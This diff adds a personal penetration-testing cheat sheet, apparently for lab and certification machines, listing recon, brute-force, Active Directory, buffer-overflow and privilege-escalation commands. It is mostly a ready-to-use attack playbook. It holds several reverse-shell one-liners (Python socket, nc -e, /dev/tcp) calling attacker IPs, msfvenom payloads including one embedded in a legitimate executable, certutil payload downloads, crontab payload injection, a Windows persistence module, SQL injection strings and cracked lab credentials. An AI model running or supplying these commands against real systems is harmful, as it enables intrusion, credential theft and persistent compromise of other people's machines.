@@ -1,0 +1,408 @@
+Netcat
+· LISTENER = nc –nlvp <port number>
+· Also use netcat to check the output on ports prior to using NMAP. In case Netcat produces additional information about the pages themselves.
+· Also we can use python to make a more meatier shell.
+· Python –c 'import pty;pty.spawn("/bin/bash")'
+Nmap Scans:
+· nmap -sV -sC -A -p- -T5 <IP Address> -oN <output name>
+· sudo nmap -v -sS -A -Pn -T5 -p- -oN <file name.txt> <IP>
+· sudo nmap -v -sU -T5 -oN <file name-udp.txt> <ip>
+· Sudo nmap -sT -p- <IP Range>
+· nmap -sV -sC -oA [export name] <IP Address>
+ 
+GoBuster:
+· gobuster -w /root/Desktop/tools/SecLists/Discovery/Web-Content/big.txt dir -u http://10.10.10.149
+· gobuster -w /root/Desktop/SecLists/Discovery/Web-Content/raft-large-files.txt dir -u   http://10.10.10.140/
+· NOTE** If we find cgi-bin among the results, run the search again with this new page.
+· NOTE** include php,txt,html,sh,py,js as possible file extensions too. With gobuster it's the -x switch where we will add our file extensions.
+· NOTE** with cgi-bins, TEST FOR SHELLSHOCK AS WELL AS RUN DIRECTORY SEARCH!!
+ 
+Exiftool
+· Exiftool (image name)
+
+Dirb:
+· dirb http://
+· **NOTE:DIRBUSTER IS PREFERRED SINCE DIRB DOESN'T CATCH FILES!
+
+Cewl:
+· Designed to help create wordlists for potential brute forcing
+· Cewl [URL] -w [wordlist file name]
+ 
+Dirsearch:
+· Dirsearch.py -u http://IP -e php,txt,cgi,sh,pl,py,html,asp,aspx,json -w /home/kali/Desktop/tools/SecLists/directory-list-2.3-medium.txt -x 400,403,404,500,503,504 -r
+· From a VM:
+· ./dirsearch.py -u http://IP -e php,txt,cgi,sh,pl,py,html,asp,aspx,json -w /home/kali/Desktop/tools/SecLists/directory-list-2.3-medium.txt -x 400,403,404,500,503,504 --plain-text-report=[OUTPUT FILENAME]
+
+Wfuzz:
+· wfuzz -u http://[IP]{PATH TO PARAMETER BEING FUZZED}?FUZZ=[file to look for. IF REQUIRED] -w /root/Desktop/tools/SecLists/directory-list-2.3-medium.txt --hc 404 [error code to disregard]
+ 
+Nikto:
+· nikto -host http://<IP> 
+ 
+ 
+OpenSSL:
+· echo | openssl s_client -connect 0x00sec.org:443  | openssl x509 -noout -text | grep DNS | sed 's/,/\n/g'
+· We can also use OpenSSL to generate password salts we can use to add users to the /etc/passwd file
+	o openssl passwd -crypt -salt xx password
+	
+	 
+ 
+Wordpress
+· wpscan --url <domain> --enumerate u (Usernames)
+· wpscan --url http://[URL]/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames
+· Wpscan --url [domain] -e ap[all plugins] -e at[all themes]
+· Wpscan --url [URL] --usernames [USERNAME] --passwords[PATH TO ROCKYOU.TXT FILE] --max-threads 100
+ 
+ 
+Hydra:
+· hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://192.168.xxx.xxx
+Hydra for Web Forms:
+· hydra -l (user) -P (password file) (MACHINE IP) http-post-form '(path to the form):(username parameter)=^USER^&(password parameter)=^PASS^:F=(error message)' -v
+· If there's a link to create an account, create one in case we don't want to brute force login.
+· For WebDav pages:
+	o hydra -L [wordlist name] -P wordlist.txt [IP Address] http-get /webdav -v
+ 
+
+Cadaver:
+· Is we find a path of /webdav, we can use cadaver to interact with it.
+· Best if we don't wee an upload path. 
+· This way we can simply use this application to interact with the target with less restrictions for uploading exploits. 
+· We can upload reverse shells this way.
+ 
+John:
+· john --wordlist=/usr/share/wordlists/rockyou.txt <hash file name>
+ 
+ 
+Password cracking:
+patator <module name> host=<ip address> user=FILE0 password=FILE1 0=<path to username file> 1=<path to password file>
+ 
+SSH:
+· If we find keys to download or copy, use the ssh command of either the key file, or the user@[ip address or domain] -I [key name]
+	o Ssh paul@plucky.local -I id_rsa4
+	o NOTE: if we're ever in a VIM shell upon successful access to a target, just use the following command to break out of the program and get a shell instead(Since that's what we want after all right?)
+		○ :set shell=/bin/bash
+	o Now activate the shell by issuing the command we set
+		○ :shell 
+
+NFS:
+· Showmount -e <IP Address>
+· Mkdir /tmp/<foldername>
+· Mount -t nfs <IP Address>:/tmp/[nfs share name] /tmp/<folder name>
+· Cd /tmp folder name>
+· To make it look more simplified:
+	o Showmount -e 10.0.2.15
+	o Mkdir /tmp/raj
+	o Mount -t nfs 10.0.2.15:/var/nfsshare /tmp/raj
+ 
+ 
+SMB:
+· Smbclient –L <IP Address>
+· smbclient '\\\\<ip address>\<share name>$'
+· Run nmap -A
+· rpcclient -U "" <ip address>
+· enum4linux <ip>
+To connect to a share anonymously:
+· smbclient //<ip address>/<share name>
+To connect via smb with password:
+· smbclient -U <username> //<ip address>/<share name>
+ 
+Searchsploit
+ 
+Exploit-DB
+ 
+For manual exploitation:
+· Confirm system information
+· Google privilege escalation for the PRECISE OS and version.
+· Check Fuzzy security for their walkthrough
+· Copy sysinfo from victim machine and run it against exploit suggestor. 
+· If we find a file running a scheduled task under root, we can add a python reverse shell. 
+· If we can't alter the file in the server, just make a separate one on the attacker machine, spin up a simple web server and use wget on the victim. 
+· Linux Smart Enumeration script 
+ 
+ 
+BUFFER OVERFLOW WALKTHROUGH:
+1. FUZZ THE APPLICATION AND OBSERVER IT'S BEHAVIOR. Does it crash? If so……
+2. Use pattern_create and pattern_offset to generate a unique string and allows us to determine where it's crashing.
+3. Find out what is being written into the EIP register.
+4. Generate shell code for the exploit (e.f msfvenom)
+5. Identify any bad characters. Cannot be included in our payload.
+6. Identify JPM ESP anywhere in the program that is usable in the exploit (no DEP or ASLR)
+7. Overwrite EIP with this memory address to jump to our shellcode and execute (note: little endian)
+ 
+BoF Side Notes:
+· Make sure to give +x permissions to run the binary we find to see what it does. 
+· Another way to gain insight into the binary is to see the names of the functions that the binary uses. The following one-liner will do just that. 
+· readelf -a vuln | grep FUNC | grep -vi glibc
+
+Buffer Overflow:
+https://github.com/LegendBegins/Overflow-Helper
+ 
+https://github.com/hyperreality/OSCP-Buffer-Overflow-in-30-minutes 
+
+Buffer Overflows and Exploits
+	• DEP and ASLR - Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR)
+	• Nmap Fuzzers:
+		○ NMap Fuzzer List
+https://nmap.org/nsedoc/categories/fuzzer.html
+		○ NMap HTTP Form Fuzzer
+nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' -p 80 $ip
+		○ Nmap DNS Fuzzer
+nmap --script dns-fuzz --script-args timelimit=2h $ip -d
+	• MSFvenom
+https://www.offensive-security.com/metasploit-unleashed/msfvenom/
+	• Windows Buffer Overflows
+		○ Controlling EIP
+ locate pattern_create
+ pattern_create.rb -l 2700
+ locate pattern_offset
+ pattern_offset.rb -q 39694438
+		○ Verify exact location of EIP - [*] Exact match at offset 2606
+buffer = "A" \* 2606 + "B" \* 4 + "C" \* 90
+		○ Check for “Bad Characters” - Run multiple times 0x00 - 0xFF
+		○ Use Mona to determine a module that is unprotected
+		○ Bypass DEP if present by finding a Memory Location with Read and Execute access for JMP ESP
+		○ Use NASM to determine the HEX code for a JMP ESP instruction
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+JMP ESP  
+00000000 FFE4 jmp esp
+		○ Run Mona in immunity log window to find (FFE4) XEF command
+!mona find -s "\xff\xe4" -m slmfc.dll  
+found at 0x5f4a358f - Flip around for little endian format
+buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
+		○ MSFVenom to create payload
+msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"
+
+		○ Final Payload with NOP slide
+buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
+		○ Create a PE Reverse Shell
+msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f
+exe -o shell_reverse.exe
+		○ Create a PE Reverse Shell and Encode 9 times with Shikata_ga_nai
+msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f
+exe -e x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+		○ Create a PE reverse shell and embed it into an existing executable
+msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=4444 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+		○ Create a PE Reverse HTTPS shell
+msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=443 -f exe -o met_https_reverse.exe
+	• Linux Buffer Overflows
+		○ Run Evans Debugger against an app
+edb --run /usr/games/crossfire/bin/crossfire
+		○ ESP register points toward the end of our CBuffer
+add eax,12
+jmp eax
+83C00C add eax,byte +0xc
+FFE0 jmp eax
+		○ Check for “Bad Characters” Process of elimination - Run multiple times 0x00 - 0xFF
+		○ Find JMP ESP address
+"\x97\x45\x13\x08" # Found at Address 08134597
+		○ crash = "\x41" * 4368 + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"
+		○ msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x0a\x0d\x20" –e x86/shikata_ga_nai
+		○ Connect to the shell with netcat:
+nc -v $ip 4444
+
+
+ 
+TESTING ACTIVE DIRECTORY:
+We use impacket for this!!
+Run enum4linux to check shares
+install python version of kerbrute
+https://github.com/TarlogicSecurity/kerbrute
+kerbrute -dv-ip <ip address>-domain spookysec.local -users iserlist -threads 100
+Add domain to /etc/hosts/file
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
+https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt
+Confirm what the has is
+Copy the hash and run it with hashcat
+hashcat -m <code from https://hashcat.net/wiki/doku.php?id=example_hashes that confirms the hash type> <hash filename> <password file name> --force
+(From tryhackme room)
+Discovered username and password 
+svc-admin == management2005
+If we find a hash, we decrypt via
+base64 -d <hash file name
+With the new credentials, we use secretsdump
+python3 secretsdump.py -just-dc <user@domain>
+Now we can use psexec to log in as any of the users and connect to the DC
+python3 psexec.py <username:@<domain> -hashes <full hash>
+Better way is with evil-winrm 
+evil-winrm -u username -H last section of hash -i <ip address>
+ 
+ 
+ 
+PRIVILEGE ESCALATION:
+LINUX:
+ALWAYS CHECK HISTORY FIRST ON VICTIM MACHINE!!
+ 
+LOCATE SUITABLE SUID ENABLE BINARIES:
+· find / -perm -u=s -type f 2>/dev/null
+ 
+USE PYTHON TO SPAWN A SHELL:
+· python -c 'import pty;pty.spawn("/bin/sh")'
+ 
+LIST ALL SUDO RULES FOR CURRENT USER:
+· Sudo -l
+ 
+ESCALATE SHELL TO BASH SHELL:
+· sudo -u scriptmanager /bin/bash
+ 
+CHANGE TO SUPERUSER:
+· Sudo su
+· Confirm root account:
+· Sudo bash
+ 
+CREATING A REVERSE SHELL VIA PYTHON ON A *NIX SYSTEM:
+· echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
+  
+Linux Privilege Escalation:
+In a linux target, we can either copy the linenum script and paste it ina writable folder OR we can save it to our system, setup a python web server and use 'wget' to transfer the file to there as well. 
+Run linenum.sh and analyze the results.
+Step 1: Check the files with the SUID/GUID bit set.
+If we want to look for SUID or GUID (SPecial USers & SPecial Groups), we can use the manual command of:
+"find / -perm -u=s type f 2>/dev/null"
+find - Initiates the "find" command
+/ - Searches the whole file system
+-perm - searches for files with specific permissions
+-u=s - Any of the permission bits mode are set for the file. Symbolic modes are accepted in this form
+-type f - Only search for files
+2>/dev/null - Suppresses errors  
+Run sudo -l to confirm permissions on system.
+ 
+Exploiting Crontab:
+run cat /etc/crontab to check what jobs are scheduled. 
+Create a msfvenom payload and add it to the cronjob
+msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
+Run the following on the target machine
+echo [MSFVENOM OUTPUT] > [SCRIPT RUNNING JOB]
+ 
+echo "/bin/bash" > ls
+ 
+Run sudo -l to get a list of available permissions on the current account. 
+If we have rights to run a file, try to get it to run /bin/bash
+If successful, run /bin/bash -p to get a root shell. 
+ 
+ 
+ 
+WINDOWS:
+ 
+ 
+ 
+ 
+ 
+ 
+FROM A METERPRETER SESSION:
+· Type run and press TAB twice to get a full list of additional commands we can run from inside a meterpreter session.
+ 
+ 
+SHELLS:
+· If we find a page that has a shell, we can attempt to use RCE on it to connect to our machine. 
+· Setup the multi/handler in metasploit
+· Set the lhost
+· On the victim shell connect to our machine via netcat and open a bash shell.
+· echo && nc 192.168.1.29 4444 -e /bin/bash
+· Via Python, create an interactive shell
+· python -c 'import pty; pty.spawn("/bin/bash")'
+ 
+ 
+GPG FILES:
+· If we find a gpg file and can locate the passphrase, we can crack via the following:
+· gpg --batch --passphrase HARPOCRATES -d login.txt.gpg
+ 
+NOTE: ALWAYS TEST HEARTBLEED IF WE FIND IT AS A JUST IN CASE!
+ 
+ 
+HASH FILES:
+· If we find files that don't have an extension or contains hex data in the file, we can run 'cat' to display the contents and pipe xxd to convert the hexdump to its original form
+· Cat <file name> | xxd -r -p > [new_file_name]
+ 
+ 
+RSA:
+· If we find a pub and enc key file, we can use the RsaCtfTool from github to decrypt the key quickly. 
+ 
+ 
+SQL Injection:
+· Basic test
+	o a' or 1=1
+	o a' or 1=1 --
+	o a' or 1=1 -- -
+	o a' or 1=1#
+ 
+ 
+https://cd6629.gitbook.io/oscp-notes/oscp-cheatsheet-unfinished
+ 
+Reconbot:
+Sudo python3 reconbot <IP address>
+ 
+ 
+https://github.com/theinfosecguy/QuickXSS
+ 
+ 
+AD Testing
+We can start with kerbrute to find valid users
+· ./kerbrute_linux_amd64 userenum --dc CONTROLLER.local -d CONTROLLER.local <username wordlist>
+ 
+ 
+ 
+For reverse shells on a Windows machine:
+· msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe
+· Transfer the payload to the victim
+· In metasploit use /multi/handler
+· Configure the payload to be a windows meterpreter shell 
+· set payload windows/meterpreter/reverse_tcp
+· Run the exploit
+· Execute the binary on the victim
+· If we get a session, put it in the background
+· Use the persistence module
+· Use exploit/windows/local/persistence
+· Set the session
+	 
+ 
+If we find a hash, we can run the program hash-identifier to see what it is. 
+We can use https://hashkiller.io/ to crack hashes quickly
+ 
+ 
+If the machine we're on isn't getting us much data, look up the software documentation to look for config files that would hold password information. 
+ 
+ 
+If we can run linpeas or winpeas, ALWAYS CHECK FOR OPEN PORTS WE DIDN'T CATCH!!. 
+If we find interesting files, we can run curl along with the newly found port number to try to pull a file. 
+ 
+· If we find a is_rsa file, copy the data to our machine
+· Run it against ssh2john.py 
+· Python ssh2john.py id_rsa > output
+· Run the new file against John
+· John –wordlist=rockyou.txt output
+· USe chmod 600 on id_rsa file if we get an "Unprotected PRivate Key File" message
+ 
+ 
+For Windows systems, best bet is to run a python http server and use certutil to transfer files to the victim machine. 
+· certutil -urlcache -split -f http://10.10.14.93:8000/nc.exe nc.exe
+ 
+We can also host an smb server on our machine:
+· smbserver.py share . -smb2support -username df -password df
+· On victim machine
+· net use \\<attack box>\s /u:df df
+· copy \\<attacker machine>\share\nc64.exe \programdata\nc.exe
+
+
+DRUPAL:
+· For exploiting drupal, we can use either of the folowing:
+	o CVE-2018-7600 from https://github.com/pimps/CVE-2018-7600
+	o OR 
+	o Drupalgeddon2 from https://github.com/dreadlocked/Drupalgeddon2
+
+
+METASPLOIT:
+· For RCE we can use the web_delivery exploit
+· We can use curl to run commands on a remote machine
+	o Curl -X POST <URL>/<path to exploit> -d "a=<command>"
+
+
+· If we come across machines with shell command capabilities, execute commands to generate a nc reverse shell,
+	o echo && nc <attacker IP> 4444 -e /bin/bash
+	o OR 
+	o Nc -e /bin/bash <attacker ip> <port>
+	o OR
+	o bash -i >& /dev/tcp/<attacker ip>/<port> 0>&1
+	o In case these don't work base64 encode the command
+	o Best to use metasploit multi/handler for this. 
+	
